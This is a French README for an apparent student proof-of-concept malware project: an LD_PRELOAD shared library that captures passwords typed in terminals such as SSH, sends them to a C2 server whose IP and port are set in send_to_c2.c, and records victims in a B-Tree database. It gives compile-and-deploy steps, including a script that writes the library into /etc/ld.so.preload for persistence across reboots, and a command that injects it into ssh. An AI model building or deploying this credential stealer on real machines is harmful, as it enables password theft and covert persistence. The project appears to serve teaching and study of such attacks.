# 🐍 Projet Malware LD_PRELOAD + Serveur C2 avec Base B-Tree (ESGI 3SIJ)

## 👥 Auteurs

- **Angelov Onur**
- **Slimani Anis**

---

## 🧠 Description du projet

Ce projet est une preuve de concept (POC) de malware utilisant la technique `LD_PRELOAD`. Il permet :

- l’interception de mots de passe saisis dans le terminal (ex : SSH),
- l’exfiltration vers un serveur distant C2,
- l’enregistrement persistant dans une base de données en **C** utilisant une structure en **B-Tree**.

---

## 🚀 Clonage du projet

```bash
git clone https://github.com/Runo76/CC1-DATABASE-ESGI
cd CC1-DATABASE-ESGI
```

---

## 📁 Structure du projet

```text
CC1-DATABASE-ESGI/
├── server/                    # Serveur C2 (écoute, enregistre les victimes)
│   ├── server.c
│   ├── register_victim.c
│   ├── Makefile
│   └── ...
├── BTreeDB/                   # Base de données des victimes (B-Tree)
│   ├── author.md
│   ├── btree.c/.h/.o
│   ├── table.c/.h/.o
│   ├── repl.c/.h/.o
│   ├── persistence.c/.h/.o
│   ├── main.c/.o
│   ├── database.db           # Fichier de base de données persistante
│   ├── id_counter.txt        # Compteur ID auto-incrémenté
│   ├── db.txt, db/, tests/   # Données et tests
│   ├── Makefile, README.md
│   └── BTreeProject/
├── LD_PRELOAD/malware/       # Malware LD_PRELOAD (client espion)
│   ├── malware.c
│   ├── send_to_c2.c
│   ├── malware.so            # Généré après compilation
│   ├── Makefile
│   └── add_to_ldso.sh        # Script pour activer automatiquement LD_PRELOAD
└── README.md
```

---

## 💻 VM 1 – Serveur C2

### 🛠️ Prérequis

Installer le serveur SSH :

```bash
sudo apt update
sudo apt install openssh-server
```

Changer le port SSH (optionnel, exemple : `Port 5555`), puis redémarrer :

```bash
sudo nano /etc/ssh/sshd_config
sudo systemctl enable ssh
sudo systemctl start ssh
```

### 🔧 Compilation du serveur et de la base

**Terminal 1 – Compilation de la base BTree:**

```bash
cd BTreeDB
make clean
make
```

**Terminal 2 – Compilation du serveur:**

```bash
cd server
make clean
make
```

### 🚀 Lancement du serveur C2

```bash
./server
```

Le serveur écoute sur le port `5555`. Il reçoit :

- `register <hostname> <password>` → inséré dans la base
- `log <hostname> <commande>` → affiché dans le terminal

---

## 💻 VM 2 – Malware LD_PRELOAD (IP a modifier)

### 🛠️ Prérequis

```bash
sudo apt update
sudo apt install openssh-server
```

### ⚙️ Configuration du malware

Dans le fichier `send_to_c2.c`, modifier :

```c
#define C2_IP "192.168.1.20"
#define C2_PORT 5555
```

---

### 🔧 Compilation et injection automatique

```bash
cd LD_PRELOAD/malware
make
chmod +x add_to_ldso.sh
sudo ./add_to_ldso.sh
```

> Ce script ajoute le chemin absolu de `malware.so` dans `/etc/ld.so.preload`.

---

## 🐚 Fonctionnalités du malware

| Fonction                        | Description                                                                                 |
|---------------------------------|---------------------------------------------------------------------------------------------|
| 🔑 Exfiltration de mot de passe | Intercepte les entrées `password:` dans un terminal                                         |
| 📦 Envoi vers serveur C2        | Envoie les credentials avec : `register <hostname> <password>`                             |
| 🚫 Blocage fichiers sensibles   | Bloque l'accès à `/etc/passwd`, `/etc/shadow` (via `open()`) même en `sudo`                |
| 💾 Persistance en B-Tree        | Enregistrement dans `database.db` avec un ID unique                                         |
| 🧠 Injection SSH testable       | Exemple : `LD_PRELOAD=./malware.so ssh user@192.168.1.xx`                                  |
| 🔁 Injection automatique        | Ajout dans `/etc/ld.so.preload` pour persistance même après reboot                         |

---

## 📊 Vérification de la base (sur la VM C2)

```bash
cd BTreeDB
./db
```

Lancer la commande dans la CLI :

```
select
Autre commande disponible detaillé dans le README.md du dossier BTreeDB
```

> Résultat exemple :
```
(1, anisdebian, 1478)
(2, onur, 1234)
```

---

## 🧪 Exemple de test complet

1. **Lancer le serveur sur la VM 1** :

```bash
(Après compilation db et server)
cd server
./server
```

2. **Sur la VM 2 (malware)** :

```bash
cd LD_PRELOAD/malware
make
chmod +x add_to_ldso.sh
sudo ./add_to_ldso.sh
```

3. **Effectuer une commande avec mot de passe :**

```bash
LD_PRELOAD=./malware.so ssh user@192.168.1.xx
```

> Le mot de passe sera intercepté et envoyé au serveur.

4. **Vérifier dans la base (VM1) :**

```bash
cd BTreeDB
./db
> select
```

---

## ❌ Désactivation du malware

```bash
sudo rm /etc/ld.so.preload
```

---

## 📎 Remarques

- Le fichier `database.db` est mis à jour automatiquement à chaque nouvelle victime.
- Le projet fonctionne dans un environnement contrôlé (POC pédagogique).
